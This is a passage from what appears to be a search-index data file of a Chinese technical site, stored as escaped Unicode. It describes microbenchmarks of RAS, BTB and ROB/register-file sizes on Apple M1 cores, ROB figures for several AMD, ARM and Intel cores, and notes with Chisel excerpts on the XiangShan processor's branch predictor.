\u200b\u5927\u5c0f\u200b\u7684\u200b\u6d4b\u8bd5\u65b9\u6cd5\u200b\u662f\u200b\u6784\u9020\u200b\u4e0d\u540c\u200b\u6df1\u5ea6\u200b\u7684\u200b\u9012\u5f52\u51fd\u6570\u200b\u8c03\u7528\u200b\uff0c\u200b\u901a\u8fc7\u89c2\u5bdf\u200b\u6027\u80fd\u200b\u6765\u200b\u5224\u65ad\u200b RAS \u200b\u662f\u5426\u200b\u4fdd\u5b58\u200b\u4e86\u200b\u6240\u6709\u200b\u8fd4\u56de\u200b\u5730\u5740\u200b\u3002</p> <p>Apple M1 Firestorm:</p> <p></p> <p>\u200b\u62d0\u70b9\u200b\u4e3a\u200b 50 \u200b\u7684\u200b\u8c03\u7528\u200b\u6df1\u5ea6\u200b\uff0c\u200b\u8bf4\u660e\u200b Apple M1 Firestorm \u200b\u7684\u200b RAS \u200b\u6709\u200b 50 \u200b\u9879\u200b\u3002</p> <p>Apple M1 Icestorm:</p> <p></p> <p>\u200b\u62d0\u70b9\u200b\u4e3a\u200b 32 \u200b\u7684\u200b\u8c03\u7528\u200b\u6df1\u5ea6\u200b\uff0c\u200b\u8bf4\u660e\u200b Apple M1 Icestorm \u200b\u7684\u200b RAS \u200b\u6709\u200b 32 \u200b\u9879\u200b\u3002</p>"},{"location":"hardware/cpu_microarchitecture.html#btb","title":"BTB \u200b\u5927\u5c0f","text":"<p>BTB \u200b\u5927\u5c0f\u200b\u7684\u200b\u6d4b\u8bd5\u65b9\u6cd5\u200b\u662f\u200b\u6784\u9020\u200b\u4e00\u7cfb\u5217\u200b\u7684\u200b\u5206\u652f\u200b\uff08\u200b\u65e0\u6761\u4ef6\u200b\u8df3\u8f6c\u200b\uff09\u200b\u6307\u4ee4\u200b\uff0c\u200b\u5982\u679c\u200b BTB \u200b\u4e0d\u591f\u200b\u5927\u200b\uff0c\u200b\u65e0\u6cd5\u200b\u4fdd\u5b58\u200b\u4e0b\u200b\u6240\u6709\u200b\u8df3\u8f6c\u200b\u6307\u4ee4\u200b\u7684\u200b\u76ee\u7684\u200b\u5730\u5740\u200b\uff0c\u200b\u6027\u80fd\u200b\u5c31\u200b\u4f1a\u200b\u51fa\u73b0\u200b\u4e0b\u964d\u200b\u3002\u200b\u7531\u4e8e\u200b\u5f88\u591a\u200b BTB \u200b\u91c7\u7528\u200b\u7ec4\u200b\u76f8\u8fde\u200b\u7684\u200b\u65b9\u5f0f\u200b\u7ec4\u7ec7\u200b\uff0c\u200b\u56e0\u6b64\u200b\u8df3\u8f6c\u200b\u6307\u4ee4\u200b\u7684\u200b\u5730\u5740\u200b\u4e5f\u200b\u4f1a\u200b\u5f71\u54cd\u200b BTB \u200b\u7684\u200b\u5b9e\u9645\u200b\u5bb9\u91cf\u200b\uff1a\u200b\u5982\u679c\u200b\u8fd9\u4e9b\u200b\u8df3\u8f6c\u200b\u6307\u4ee4\u200b\u7684\u200b\u5730\u5740\u200b\u90fd\u200b\u6620\u5c04\u200b\u5230\u200b\u4e86\u200b BTB \u200b\u7684\u200b\u4e00\u90e8\u5206\u200b Set \u200b\u4e0a\u200b\uff0c\u200b\u90a3\u4e48\u200b\u5176\u4f59\u200b\u7684\u200b Set \u200b\u5c06\u200b\u65e0\u6cd5\u200b\u5229\u7528\u200b\u3002\u200b\u56e0\u6b64\u200b\u6d4b\u8bd5\u200b BTB \u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u4e0d\u4ec5\u200b\u8981\u200b\u4fee\u6539\u200b\u5206\u652f\u200b\u7684\u200b\u6570\u91cf\u200b\uff0c\u200b\u8fd8\u8981\u200b\u4fee\u6539\u200b\u5206\u652f\u200b\u7684\u200b\u5730\u5740\u200b\u95f4\u9694\u200b\uff08stride\uff09\u3002</p> <p>Apple M1 Firestorm:</p> <p>\u200b\u9996\u5148\u200b\u770b\u200b Stride=4B\uff0c\u200b\u4e5f\u200b\u5c31\u662f\u200b\u6240\u6709\u200b\u8df3\u8f6c\u200b\u6307\u4ee4\u200b\u5730\u5740\u200b\u4e0a\u200b\u90fd\u200b\u662f\u200b\u8fde\u7eed\u200b\u7684\u200b\uff0c\u200b\u6ca1\u6709\u200b\u989d\u5916\u200b\u7684\u200b\u7a7a\u95f4\u200b\uff0c\u200b\u6b64\u65f6\u200b\u8df3\u8f6c\u200b\u6307\u4ee4\u200b\u6570\u91cf\u200b\u548c\u200b\u6bcf\u4e2a\u200b\u8df3\u8f6c\u200b\u6307\u4ee4\u200b\u7684\u200b\u5468\u671f\u200b\u6570\u200b\u5173\u7cfb\u200b\u662f\u200b\uff1a</p> <p></p> <p>\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\uff0c\u200b\u5728\u200b 1024 \u200b\u4e2a\u200b\u5206\u652f\u200b\u4e4b\u524d\u200b\u90fd\u200b\u53ef\u4ee5\u200b\u505a\u5230\u200b\u6bcf\u200b\u5468\u671f\u200b\u4e00\u4e2a\u200b\u5206\u652f\u200b\u6307\u4ee4\u200b\uff0c\u200b\u8bf4\u660e\u200b\u8fd9\u662f\u200b\u7b2c\u4e00\u7ea7\u200b\u7684\u200b BTB\uff0c\u200b\u5927\u5c0f\u200b\u4e3a\u200b 1024\uff1b\u200b\u4e4b\u540e\u200b\u5f88\u957f\u200b\u4e00\u6bb5\u200b\u90fd\u200b\u662f\u200b\u4e09\u200b\u5468\u671f\u200b\u4e00\u4e2a\u200b\u5206\u652f\u200b\u6307\u4ee4\u200b\uff0c\u200b\u76f4\u5230\u200b 40000+ \u200b\u624d\u200b\u5f00\u59cb\u200b\u8d85\u8fc7\u200b\u4e09\u200b\u5468\u671f\u200b\uff0c\u200b\u800c\u200b\u6b63\u597d\u200b M1 Firestorm \u200b\u7684\u200b L1 \u200b\u6307\u4ee4\u200b\u7f13\u5b58\u200b\u662f\u200b 192KB\uff0c\u200b\u6309\u200b 4B \u200b\u4e00\u4e2a\u200b\u5206\u652f\u200b\u7b97\u200b\u5c31\u662f\u200b 49152 \u200b\u4e2a\u200b\u5206\u652f\u200b\uff0c\u200b\u57fa\u672c\u200b\u548c\u200b 40000+ \u200b\u7684\u200b\u62d0\u70b9\u200b\u4e00\u81f4\u200b\uff0c\u200b\u8bf4\u660e\u200b M1 Firestorm \u200b\u7684\u200b L1 \u200b\u6307\u4ee4\u200b\u662f\u200b\u4f5c\u4e3a\u200b\u7b2c\u4e8c\u7ea7\u200b BTB \u200b\u5b58\u5728\u200b\u7684\u200b\u3002</p> <p>\u200b\u8fdb\u4e00\u6b65\u200b\uff0c\u200b\u901a\u8fc7\u200b\u63d2\u5165\u200b NOP \u200b\u6307\u4ee4\u200b\u589e\u52a0\u200b\u5206\u652f\u200b\u7684\u200b\u95f4\u8ddd\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u89c2\u5bdf\u200b\u5230\u200b\u4e0d\u540c\u200b stride \u200b\u4e0b\u200b\u62d0\u70b9\u200b\u51fa\u73b0\u200b\u4e86\u200b\u53d8\u5316\u200b\uff1a</p> <p></p> <ul> <li>stride=4B \u200b\u65f6\u200b\uff0c\u200b\u7b2c\u4e00\u7ea7\u200b BTB \u200b\u62d0\u70b9\u200b\u4e3a\u200b 1024\uff0c\u200b\u7b2c\u4e8c\u7ea7\u200b BTB \u200b\u62d0\u70b9\u200b\u4e3a\u200b 49152</li> <li>stride=8B \u200b\u65f6\u200b\uff0c\u200b\u7b2c\u4e00\u7ea7\u200b BTB \u200b\u62d0\u70b9\u200b\u4e3a\u200b 512\uff0c\u200b\u7b2c\u4e8c\u7ea7\u200b BTB \u200b\u62d0\u70b9\u200b\u4e3a\u200b 24576</li> <li>stride=16B \u200b\u65f6\u200b\uff0c\u200b\u7b2c\u4e00\u7ea7\u200b BTB \u200b\u62d0\u70b9\u200b\u4e3a\u200b 256\uff0c\u200b\u7b2c\u4e8c\u7ea7\u200b BTB \u200b\u62d0\u70b9\u200b\u4e3a\u200b 12288</li> </ul> <p>\u200b\u8fd9\u662f\u200b\u5178\u578b\u200b\u7684\u200b\u7ec4\u200b\u76f8\u8fde\u200b\u7684\u200b\u573a\u666f\u200b\uff1a\u200b\u5047\u5982\u200b Index \u200b\u4f4d\u53d6\u200b\u7684\u200b\u662f\u200b\u5730\u5740\u200b\u7684\u200b <code>[n:2]</code> \u200b\u4f4d\u200b\uff0c\u200b\u5f53\u200b stride=8B \u200b\u65f6\u200b\uff0c\u200b\u5730\u5740\u200b\u7684\u200b <code>[2]</code> \u200b\u4f4d\u200b\u5fc5\u7136\u200b\u4e3a\u200b 0\uff0c\u200b\u6b64\u65f6\u200b Index \u200b\u53ea\u80fd\u200b\u662f\u200b\u5076\u6570\u200b\uff0c\u200b\u90a3\u4e48\u200b\u5947\u6570\u200b Index \u200b\u7684\u200b\u9879\u200b\u5c31\u200b\u88ab\u200b\u6d6a\u8d39\u200b\u4e86\u200b\uff0c\u200b\u8868\u73b0\u200b\u51fa\u6765\u200b\u7684\u200b\u5bb9\u91cf\u200b\u53ea\u6709\u200b\u539f\u6765\u200b 1024 \u200b\u7684\u200b\u4e00\u534a\u200b\uff0c\u200b\u4e5f\u200b\u5c31\u662f\u200b 512\u3002\u200b\u8fdb\u4e00\u6b65\u200b\uff0cstride=16B \u200b\u65f6\u200b\uff0cIndex \u200b\u53ea\u80fd\u200b\u662f\u200b 4 \u200b\u7684\u200b\u500d\u6570\u200b\uff0c\u200b\u5bb9\u91cf\u200b\u53ea\u6709\u200b 1024 \u200b\u7684\u200b\u56db\u5206\u4e4b\u4e00\u200b\uff0c\u200b\u4e5f\u200b\u5c31\u662f\u200b 256\u3002</p> <p>\u200b\u4e0d\u65ad\u200b\u589e\u52a0\u200b stride\uff0cstride=1024B \u200b\u65f6\u200b\u62d0\u70b9\u200b\u4e3a\u200b 4\uff0cstride=2048B \u200b\u62d0\u70b9\u200b\u4e3a\u200b 2\uff0cstride=4096B \u200b\u62d0\u70b9\u200b\u4f9d\u7136\u200b\u4e3a\u200b 2\uff0c\u200b\u8bf4\u660e\u200b\u7b2c\u4e00\u7ea7\u200b BTB \u200b\u662f\u200b 2 Way\uff0c\u200b\u6b64\u65f6\u200b Index \u200b\u4f4d\u6570\u200b\u53d6\u200b\u7684\u200b\u662f\u200b\u5730\u5740\u200b\u7684\u200b <code>[10:2]</code> \u200b\u4f4d\u200b\u3002</p> <p>Apple M1 Icestorm:</p> <p></p> <p>\u200b\u548c\u200b Firestorm \u200b\u7c7b\u4f3c\u200b\uff0cstride=4B \u200b\u65f6\u200b\uff0c\u200b\u7b2c\u4e00\u7ea7\u200b BTB \u200b\u5927\u5c0f\u200b\u53ef\u4ee5\u200b\u770b\u51fa\u200b\u4e5f\u200b\u662f\u200b 1024 \u200b\u9879\u200b\uff0c\u200b\u5e76\u4e14\u200b\u4ece\u200b stride=8B \u200b\u65f6\u200b\u7b2c\u4e00\u4e2a\u200b\u62d0\u70b9\u200b\u524d\u200b\u63a8\u200b\uff0c\u200b\u53ef\u77e5\u200b\u7b2c\u4e00\u7ea7\u200b BTB \u200b\u4e5f\u200b\u662f\u200b\u7ec4\u200b\u76f8\u8fde\u200b\uff1b\u200b\u7b2c\u4e8c\u7ea7\u200b BTB \u200b\u4f9d\u7136\u200b\u7531\u200b L1 \u200b\u6307\u4ee4\u200b\u7f13\u5b58\u200b\u63d0\u4f9b\u200b\uff0cIcestorm \u200b\u7684\u200b\u6307\u4ee4\u200b\u7f13\u5b58\u200b\u662f\u200b 128KB\uff0c\u200b\u5bf9\u5e94\u200b 32768 \u200b\u4e2a\u200b\u5206\u652f\u200b\uff0c\u200b\u5f53\u200b stride=4B \u200b\u65f6\u200b\u5373\u4f7f\u200b\u8d85\u8fc7\u200b 32768 \u200b\u4e2a\u200b\u5206\u652f\u200b\u4e5f\u200b\u6ca1\u6709\u200b\u770b\u5230\u200b\u660e\u663e\u200b\u7684\u200b\u6027\u80fd\u200b\u4e0b\u964d\u200b\uff0c\u200b\u9884\u8ba1\u200b\u9884\u53d6\u5668\u200b\u8d77\u5230\u200b\u4e86\u200b\u4f5c\u7528\u200b\uff1b\u200b\u5f53\u200b stride=8B \u200b\u65f6\u200b\u7b2c\u4e8c\u4e2a\u200b\u62d0\u70b9\u200b\u662f\u200b 16384\uff0c\u200b\u8bf4\u660e\u200b L1 \u200b\u6307\u4ee4\u200b\u7f13\u5b58\u200b\u662f\u200b\u7ec4\u200b\u76f8\u8fde\u200b\uff0c\u200b\u7b26\u5408\u200b\u9884\u671f\u200b\u3002</p> <p>\u200b\u4e0d\u8fc7\u200b\u5728\u200b stride \u200b\u589e\u5927\u200b\u65f6\u200b\uff0c\u200b\u7b2c\u4e00\u7ea7\u200b BTB \u200b\u7684\u200b\u62d0\u70b9\u200b\u5e76\u200b\u4e0d\u200b\u603b\u662f\u200b\u76f8\u5e94\u200b\u9664\u4ee5\u200b 2:</p> stride size 4 1024 8 512 16 256 32 1024 64 512 128 256 256 128 512 64 1024 32 2048 16 4096 8 8192 4 16384 2 32768 2 65536 2 <p>\u200b\u76ee\u6d4b\u200b\u662f\u200b Index \u200b\u4f4d\u6570\u200b\u505a\u200b\u4e86\u200b\u4e00\u4e9b\u200b\u54c8\u5e0c\u200b\uff0c\u200b\u800c\u200b\u4e0d\u662f\u200b\u76f4\u63a5\u200b\u53d6\u200b\u5730\u5740\u200b\u7684\u200b\u4f4d\u6570\u200b\uff0c\u200b\u5730\u5740\u200b\u6d89\u53ca\u200b\u4e86\u200b <code>[15:2]</code>\u3002\u200b\u7b2c\u4e00\u7ea7\u200b BTB \u200b\u662f\u200b 2 Way\u3002</p>"},{"location":"hardware/cpu_microarchitecture.html#robprf","title":"ROB/PRF \u200b\u5927\u5c0f","text":"<p>ROB \u200b\u6309\u7a0b\u5e8f\u200b\u6267\u884c\u200b\u987a\u5e8f\u200b\u4fdd\u5b58\u200b\u4e86\u200b\u4e71\u5e8f\u6267\u884c\u200b\u7684\u200b\u6307\u4ee4\u200b\uff0c\u200b\u4ee5\u200b\u4fdd\u8bc1\u200b\u5f02\u5e38\u200b\u65f6\u200b\u53ef\u4ee5\u200b\u7cbe\u786e\u200b\u6062\u590d\u200b\u3002\u200b\u6d4b\u8bd5\u200b ROB \u200b\u5927\u200b\u5c0f\u65f6\u200b\uff0c\u200b\u901a\u5e38\u200b\u65b9\u6cd5\u200b\u662f\u200b\u6784\u9020\u200b\u4e00\u7cfb\u5217\u200b pointer chasing \u200b\u7684\u200b load \u200b\u6307\u4ee4\u200b\uff0c\u200b\u5b83\u200b\u9700\u8981\u200b\u5f88\u957f\u200b\u7684\u200b\u65f6\u95f4\u200b\u6267\u884c\u200b\uff0c\u200b\u7136\u540e\u200b\u5728\u200b\u8fd9\u4e9b\u200b load \u200b\u4e4b\u95f4\u200b\u63d2\u5165\u200b\u5f88\u591a\u200b nop \u200b\u6307\u4ee4\u200b\uff0c\u200b\u5f53\u200b ROB \u200b\u53ef\u4ee5\u200b\u5bb9\u7eb3\u200b\u4e0b\u200b\u591a\u4e2a\u200b load \u200b\u6307\u4ee4\u200b\u65f6\u200b\uff0c\u200b\u6027\u80fd\u200b\u4f1a\u200b\u6bd4\u8f83\u200b\u597d\u200b\uff1b\u200b\u5f53\u200b ROB \u200b\u53ea\u80fd\u200b\u5bb9\u7eb3\u200b\u4e0b\u200b\u4e00\u4e2a\u200b load \u200b\u6307\u4ee4\u200b\u65f6\u200b\uff0c\u200b\u6027\u80fd\u200b\u4f1a\u200b\u4e0b\u964d\u200b\u3002</p> <p>\u200b\u4f7f\u7528\u200b\u8fd9\u4e2a\u200b\u65b9\u6cd5\u200b\u6d4b\u91cf\u200b\uff0c\u200b\u4f7f\u7528\u200b nop \u200b\u586b\u5145\u200b ROB \u200b\u65f6\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u5f97\u5230\u200b Icestorm \u200b\u7684\u200b ROB \u200b\u5bb9\u91cf\u200b\u5728\u200b 412-415 \u200b\u5de6\u53f3\u200b\uff1a</p> <p></p> <p>\u200b\u4f46\u200b\u5728\u200b\u7f51\u4e0a\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b M1 Firestorm ROB \u200b\u5927\u5c0f\u200b\u7684\u200b\u4e0d\u540c\u200b\u7684\u200b\u5206\u6790\u200b\uff0c\u200b\u8fd9\u200b\u662f\u56e0\u4e3a\u200b M1 Firestorm \u200b\u7684\u200b ROB \u200b\u4e0d\u662f\u200b\u4f20\u7edf\u200b\u7684\u200b\u6bcf\u6761\u200b\u6307\u4ee4\u200b\u4e00\u4e2a\u200b ROB \u200b\u8868\u9879\u200b\u7684\u200b\u8bbe\u8ba1\u200b\uff0c\u200b\u800c\u662f\u200b\u5141\u8bb8\u200b\u591a\u6761\u200b\u6307\u4ee4\u200b\u653e\u5728\u200b\u540c\u4e00\u4e2a\u200b\u8868\u9879\u200b\u91cc\u200b\uff0c\u200b\u4f46\u200b\u53c8\u200b\u5bf9\u200b\u540c\u4e00\u4e2a\u200b\u8868\u9879\u200b\u91cc\u200b\u7684\u200b\u591a\u6761\u200b\u6307\u4ee4\u200b\u6dfb\u52a0\u200b\u4e86\u200b\u4e00\u4e9b\u200b\u9650\u5236\u200b\uff0c\u200b\u56e0\u6b64\u200b\u7528\u200b\u4e0d\u540c\u200b\u6307\u4ee4\u200b\u5e8f\u5217\u200b\u6d4b\u200b\u51fa\u6765\u200b\u7684\u200b ROB \u200b\u5927\u5c0f\u200b\u5c31\u200b\u4f1a\u200b\u4e0d\u200b\u4e00\u6837\u200b\uff1a\u200b\u5927\u91cf\u200b\u7684\u200b NOP \u200b\u5927\u200b\u6982\u7387\u200b\u53ef\u4ee5\u200b\u7d27\u5bc6\u200b\u5730\u200b\u586b\u6ee1\u200b\u8868\u9879\u200b\u91cc\u200b\u7684\u200b\u591a\u6761\u200b\u6307\u4ee4\u200b\uff0c\u200b\u56e0\u6b64\u200b\u8868\u73b0\u200b\u51fa\u6765\u200b\u7684\u200b ROB \u200b\u5bb9\u91cf\u200b\u5c31\u200b\u5f88\u5927\u200b\uff1b\u200b\u5982\u679c\u200b\u53ef\u4ee5\u200b\u6784\u9020\u200b\u51fa\u200b\u4e00\u4e2a\u200b\u6307\u4ee4\u200b\u5e8f\u5217\u200b\uff0c\u200b\u4f7f\u5f97\u200b\u6bcf\u6761\u200b\u6307\u4ee4\u200b\u90fd\u200b\u72ec\u5360\u200b\u4e00\u4e2a\u200b ROB \u200b\u6761\u76ee\u200b\uff0c\u200b\u90a3\u624d\u200b\u53ef\u4ee5\u200b\u6d4b\u51fa\u200b\u771f\u5b9e\u200b\u7684\u200b ROB \u200b\u5927\u5c0f\u200b\u3002</p> <p>\u200b\u628a\u200b NOP \u200b\u4fee\u6539\u200b\u6210\u200b\u6574\u6570\u200b add \u200b\u6307\u4ee4\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\u62d0\u70b9\u200b\u5728\u200b 77-79 \u200b\u5de6\u53f3\u200b\uff1a</p> <p></p> <p>\u200b\u7528\u200b add \u200b\u6307\u4ee4\u200b\u6d4b\u8bd5\u200b\u7684\u200b\u5219\u200b\u662f\u200b\u7269\u7406\u200b\u901a\u7528\u5bc4\u5b58\u5668\u200b\u5806\u200b\uff08Physical Register File\uff0cPRF\uff09\u200b\u7684\u200b\u5927\u5c0f\u200b\uff1a\u200b\u5bc4\u5b58\u5668\u200b\u91cd\u547d\u540d\u200b\u65f6\u200b\uff0c\u200b\u4f1a\u200b\u7ed9\u200b\u76ee\u7684\u200b\u5bc4\u5b58\u5668\u200b\u5206\u914d\u200b\u4e00\u4e2a\u200b\u65b0\u200b\u7684\u200b\u7269\u7406\u200b\u901a\u7528\u5bc4\u5b58\u5668\u200b\uff0c\u200b\u540c\u65f6\u200b\u8bb0\u5f55\u200b\u4e0b\u8be5\u200b\u67b6\u6784\u200b\u5bc4\u5b58\u5668\u200b\u539f\u6765\u200b\u6620\u5c04\u200b\u7684\u200b\u65e7\u200b\u7269\u7406\u200b\u901a\u7528\u5bc4\u5b58\u5668\u200b\uff0c\u200b\u5f53\u200b\u6307\u4ee4\u200b\u4ece\u200b ROB \u200b\u4e2d\u200b\u63d0\u4ea4\u200b\u65f6\u200b\uff0c\u200b\u65e7\u200b\u7684\u200b\u7269\u7406\u200b\u901a\u7528\u5bc4\u5b58\u5668\u200b\u624d\u200b\u5f97\u5230\u200b\u91ca\u653e\u200b\u3002\u200b\u7531\u4e8e\u200b load \u200b\u6307\u4ee4\u200b\u5835\u585e\u200b\u4e86\u200b ROB \u200b\u7684\u200b\u63d0\u4ea4\u200b\uff0c\u200b\u5bfc\u81f4\u200b ROB \u200b\u91cc\u200b\u6709\u200b\u5927\u91cf\u200b\u7684\u200b add \u200b\u6307\u4ee4\u200b\uff0c\u200b\u6bcf\u6761\u200b add \u200b\u6307\u4ee4\u200b\u90fd\u200b\u5206\u914d\u200b\u4e86\u200b\u4e00\u4e2a\u200b\u7269\u7406\u200b\u901a\u7528\u5bc4\u5b58\u5668\u200b\uff0c\u200b\u5e76\u4e14\u200b\u90fd\u200b\u8fd8\u200b\u6ca1\u6709\u200b\u91ca\u653e\u200b\uff0c\u200b\u6b64\u65f6\u200b\u62d0\u70b9\u200b\u51fa\u73b0\u200b\uff0c\u200b\u8bf4\u660e\u200b\u7269\u7406\u200b\u901a\u7528\u5bc4\u5b58\u5668\u200b\u5806\u200b\u5df2\u7ecf\u200b\u6162\u200b\u4e86\u200b\uff0c\u200b\u65b0\u200b\u7684\u200b add \u200b\u6307\u4ee4\u200b\u963b\u585e\u200b\u5728\u200b\u91cd\u547d\u540d\u200b\u9636\u6bb5\u200b\u3002</p>"},{"location":"hardware/cpu_microarchitecture.html#_4","title":"\u53c2\u8003\u6587\u732e","text":"<ul> <li>Apple Microarchitecture Research by Dougall Johnson</li> <li>Apple M1 Icestorm \u200b\u5fae\u200b\u67b6\u6784\u200b\u8bc4\u6d4b\u200b\uff08\u200b\u4e0a\u200b\uff09:\u200b\u91cd\u94f8\u200b\u5c0f\u6838\u200b\u8363\u5149\u200b</li> <li>Apple M1 Icestorm \u200b\u5fae\u200b\u67b6\u6784\u200b\uff08\u200b\u4e0b\u200b\uff09:\u200b\u91cd\u94f8\u200b\u5c0f\u6838\u200b\u8363\u5149\u200b</li> </ul>"},{"location":"hardware/cpu_microarchitecture.html#rob","title":"\u591a\u79cd\u200b\u5904\u7406\u5668\u200b\u67b6\u6784\u200b\u7684\u200b ROB \u200b\u6d4b\u8bd5","text":"<p>AMD Zen 1: \u200b\u5927\u7ea6\u200b 192 \u200b\u6761\u200b</p> <p></p> <p>AMD Zen 2: \u200b\u5927\u7ea6\u200b 224 \u200b\u6761\u200b</p> <p></p> <p>ARM Neoverse N1: \u200b\u5927\u7ea6\u200b 128 \u200b\u6761\u200b</p> <p></p> <p>Intel Broadwell: \u200b\u5927\u7ea6\u200b 192 \u200b\u6761\u200b</p> <p></p> <p>Intel Ivy Bridge EP: \u200b\u5927\u7ea6\u200b 168 \u200b\u6761\u200b</p> <p></p>"},{"location":"hardware/cpu_microarchitecture.html#_5","title":"\u591a\u79cd\u200b\u5904\u7406\u5668\u200b\u67b6\u6784\u200b\u7684\u200b\u6838\u200b\u95f4\u901a\u4fe1\u200b\u5ef6\u8fdf\u200b\u6d4b\u8bd5","text":"<p>\u200b\u6d4b\u8bd5\u5de5\u5177\u200b\uff1ahttps://github.com/clamchowder/Microbenchmarks/tree/master/CoherencyLatency</p> <p>\u200b\u6d4b\u8bd5\u200b\u7ed3\u679c\u200b\uff1a</p> <p>Apple M1:</p> <p></p> <p>Intel i9-12900KS:</p> <p></p> <p>Intel i9-14900K:</p> <p></p>"},{"location":"hardware/cpu_microarchitecture.html#_6","title":"\u9999\u5c71","text":"<p>\u200b\u6587\u6863\u200b\uff1a\u200b\u5206\u652f\u200b\u9884\u6d4b\u200b (Branch Prediction) - XiangShan \u200b\u5b98\u65b9\u200b\u6587\u6863\u200b</p>"},{"location":"hardware/cpu_microarchitecture.html#_7","title":"\u96c1\u6816\u6e56","text":"<p>yanqihu \u200b\u7248\u672c\u200b\uff1aOpenXiangShan/XiangShan yanqihu branch</p> <p>\u200b\u9999\u5c71\u200b\u5904\u7406\u5668\u200b\u5206\u652f\u200b\u9884\u6d4b\u200b\u90e8\u4ef6\u200b\u8bbe\u8ba1\u200b\u5b9e\u73b0\u200b</p> <p>FetchWidth: \u200b\u4ee5\u200b 32 bit \u200b\u4e3a\u200b\u5355\u4f4d\u200b\uff0c\u200b\u6bcf\u4e2a\u200b\u5468\u671f\u200b\u7684\u200b\u53d6\u6307\u4ee4\u200b\u5bbd\u5ea6\u200b\uff0c\u200b\u9ed8\u8ba4\u200b\u662f\u200b 8\uff0c\u200b\u4e5f\u200b\u5c31\u662f\u200b ICache \u200b\u6bcf\u4e2a\u200b\u5468\u671f\u200b\u51fa\u200b 32 \u200b\u5b57\u8282\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u5728\u200b ICacheResp \u200b\u7684\u200b data \u200b\u5b57\u6bb5\u200b\u91cc\u200b\u770b\u5230\u200b\uff1a</p> <pre><code>class ICacheResp extends ICacheBundle\n{\n  val pc = UInt(VAddrBits.W)\n  val data = UInt((FetchWidth * 32).W)\n  val mmio = Bool()\n  val mask = UInt(PredictWidth.W)\n  val ipf = Bool() // page fault\n  val acf = Bool() // access fault\n}\n</code></pre> <p>\u200b\u4f46\u662f\u200b\u7531\u4e8e\u200b\u6709\u200b RVC \u200b\u7684\u200b\u5b58\u5728\u200b\uff0c32 \u200b\u5b57\u8282\u200b\u53ef\u80fd\u200b\u4f1a\u653e\u200b 16 \u200b\u6761\u200b\u6307\u4ee4\u200b\uff0cyanqihu \u200b\u67b6\u6784\u200b\u4f1a\u200b\u5bf9\u200b\u8fd9\u200b 16 \u200b\u4e2a\u200b\u53ef\u80fd\u200b\u7684\u200b\u4f4d\u7f6e\u200b\u90fd\u200b\u505a\u200b\u5206\u652f\u200b\u9884\u6d4b\u200b\uff0c\u200b\u8fd9\u200b\u5c31\u662f\u200b PredictWidth\uff0c\u200b\u5f00\u542f\u200b RVC \u200b\u65f6\u200b PredictWidth \u200b\u662f\u200b\u4e24\u500d\u200b\u7684\u200b FetchWidth \u200b\u4e5f\u200b\u5c31\u662f\u200b 16\uff0c\u200b\u4e0d\u200b\u5f00\u542f\u200b\u65f6\u200b PredictWidth \u200b\u7b49\u4e8e\u200b FetchWidth \u200b\u4e5f\u200b\u5c31\u662f\u200b 8\u3002\u200b\u4e0b\u9762\u200b\u90fd\u200b\u6309\u200b\u5f00\u542f\u200b\u4e86\u200b RVC \u200b\u6765\u200b\u8ba8\u8bba\u200b\u3002Predict Width \u200b\u8ba1\u7b97\u516c\u5f0f\u200b\u5982\u4e0b\u200b\uff1a</p> <pre><code>val PredictWidth = FetchWidth * (if (HasCExtension) 2 else 1)\n</code></pre> <p>\u200b\u9884\u6d4b\u200b\u7684\u200b\u65f6\u5019\u200b\uff0cMicroBTB \u200b\u8bbe\u7f6e\u200b\u4e86\u200b PredictWidth = 16 \u200b\u4e2a\u200b bank\uff0c\u200b\u6bcf\u4e2a\u200b bank \u200b\u9884\u6d4b\u200b\u5bf9\u5e94\u200b\u4f4d\u7f6e\u200b\u4e0a\u200b\u7684\u200b\u6307\u4ee4\u200b\uff0c\u200b\u9884\u6d4b\u200b\u5b83\u200b\uff1a</p> <ul> <li>\u200b\u662f\u4e0d\u662f\u200b\u6761\u4ef6\u200b\u5206\u652f\u200b\u6307\u4ee4\u200b</li> <li>\u200b\u662f\u4e0d\u662f\u200b\u95f4\u63a5\u200b\u8df3\u8f6c\u200b\u6307\u4ee4\u200b</li> <li>\u200b\u5982\u679c\u200b\u8df3\u8f6c\u200b\uff0c\u200b\u76ee\u7684\u200b\u5730\u5740\u200b\u662f\u200b\u591a\u5c11\u200b</li> </ul> <pre><code>class ReadResp extends XSBundle\n{\n    val valid = Bool()\n    val taken = Bool()\n    val target = UInt(VAddrBits.W)\n    val is_RVC = Bool()\n    val is_Br = Bool()\n}\n</code></pre> <p>\u200b\u6bcf\u4e2a\u200b bank \u200b\u5185\u200b\u662f\u200b 16 \u200b\u4e2a\u200b\u5168\u200b\u76f8\u8fde\u200b\u7684\u200b entry\uff0c\u200b\u6bcf\u4e2a\u200b entry \u200b\u8bb0\u5f55\u200b\u4e86\u200b\uff1a</p> <ul> <li>is_Br: \u200b\u662f\u5426\u200b\u95f4\u63a5\u200b\u8df3\u8f6c\u200b</li> <li>is_RVC: \u200b\u662f\u5426\u200b\u538b\u7f29\u200b\u6307\u4ee4\u200b</li> <li>valid: \u200b\u662f\u5426\u200b\u5408\u6cd5\u200b</li> <li>2 bit pred: \u200b\u4e24\u4f4d\u200b\u7684\u200b\u9971\u548c\u200b\u8ba1\u6570\u5668\u200b\uff0c\u200b\u9884\u6d4b\u200b\u5206\u652f\u200b\u65b9\u5411\u200b</li> <li>20 bit tag: \u200b\u7528\u4e8e\u200b\u627e\u5230\u200b\u5339\u914d\u200b\u7684\u200b\u5168\u200b\u76f8\u8fde\u200b\u7684\u200b entry\uff0c\u200b\u5982\u679c\u200b FetchWidth \u200b\u662f\u200b 4\uff0c\u200b\u4e00\u6b21\u200b\u53d6\u200b 32 \u200b\u5b57\u8282\u200b\uff0c\u200b\u90a3\u4e48\u200b tag \u200b\u5c31\u662f\u200b\u820d\u5f03\u200b PC \u200b\u4f4e\u200b 5 \u200b\u4f4d\u540e\u200b\u53d6\u200b 20 \u200b\u4f4d\u200b</li> <li>20 bit lower: 